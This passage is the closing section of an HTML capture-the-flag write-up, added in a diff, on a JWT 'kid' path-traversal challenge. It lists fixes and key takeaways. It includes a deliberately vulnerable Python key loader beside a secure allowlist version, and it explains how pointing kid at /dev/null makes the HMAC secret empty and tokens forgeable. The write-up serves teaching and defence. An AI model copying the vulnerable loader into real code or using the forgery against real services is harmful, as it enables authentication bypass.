+        <div class="vuln-desc">Upload a file with known content, then point kid to it. Full key control.</div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- Vulnerabilities -->
+    <h2 data-num="08">Vulnerabilities & Fixes</h2>
+
+    <h3>1. Unsanitized kid Parameter</h3>
+    <p>The server used the <code>kid</code> value directly as a file path without any validation, allowing path traversal to arbitrary files on the system.</p>
+    <div class="warning-box">
+      <p><strong>Fix:</strong> Never use the <code>kid</code> parameter directly as a file path. Validate it against an allowlist of known key IDs. Use a lookup table (database or config file) mapping IDs to key material.</p>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">python — secure implementation</span>
+      </div>
+      <pre><span class="cm"># ✅ SECURE: allowlist approach</span>
+ALLOWED_KEYS = {
+    <span class="str">"guest.key"</span>: <span class="str">"super_secret_guest_value"</span>,
+    <span class="str">"admin.key"</span>: <span class="str">"super_secret_admin_value"</span>,
+}
+
+<span class="kw">def</span> <span class="fn">get_key</span>(kid):
+    <span class="kw">if</span> kid <span class="kw">not in</span> ALLOWED_KEYS:
+        <span class="kw">raise</span> ValueError(<span class="str">f"Unknown key ID: {kid}"</span>)
+    <span class="kw">return</span> ALLOWED_KEYS[kid]
+
+<span class="cm"># ❌ VULNERABLE: direct file path</span>
+<span class="kw">def</span> <span class="fn">get_key_vulnerable</span>(kid):
+    <span class="kw">with</span> <span class="fn">open</span>(kid) <span class="kw">as</span> f:   <span class="cm"># attacker controls kid!</span>
+        <span class="kw">return</span> f.read()</pre>
+    </div>
+
+    <h3>2. Trusting Client-Supplied Algorithm</h3>
+    <p>The server accepted the algorithm specified in the JWT header. In a properly configured system, the server should enforce its own expected algorithm and reject tokens that use anything else.</p>
+    <div class="warning-box">
+      <p><strong>Fix:</strong> Hardcode the expected algorithm server-side. Never read it from the token header. Explicitly reject <code>alg: none</code> and unexpected algorithms.</p>
+    </div>
+
+    <h3>3. Weak Role Validation</h3>
+    <p>The <code>role</code> claim was trusted directly from the JWT payload. Once the signature was forged, any role could be claimed.</p>
+    <div class="warning-box">
+      <p><strong>Fix:</strong> For high-privilege operations, validate roles server-side against a database in addition to verifying the JWT signature. Never rely solely on JWT claims for authorization decisions.</p>
+    </div>
+
+    <hr class="divider">
+
+    <!-- Takeaways -->
+    <h2 data-num="09">Key Takeaways</h2>
+
+    <p>This challenge demonstrates a subtle but critical class of JWT vulnerabilities. The <code>kid</code> parameter is part of the JWT standard and is designed to help servers select the right key when multiple keys are in use. However, it was never intended to be used as a raw file path.</p>
+
+    <p>The lesson here applies broadly: <strong>never trust input from a client to construct file paths, database queries, or system commands</strong>. The JWT header is just as attacker-controlled as any HTTP parameter. Every field in it must be validated before use.</p>
+
+    <p>The <code>/dev/null</code> trick specifically works because it is a predictable, always-present file on every Linux/Unix system that returns an empty byte stream — making the HMAC secret deterministically empty and therefore forgeable.</p>
+
+  </article>
+</div>
+
+<footer>
+  <div class="container">
+    <div class="footer-content">
+      <div class="footer-text">RedFox CTF 2026 — JWT kid Path Traversal Writeup</div>
+      <div class="footer-badge">✓ SOLVED</div>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
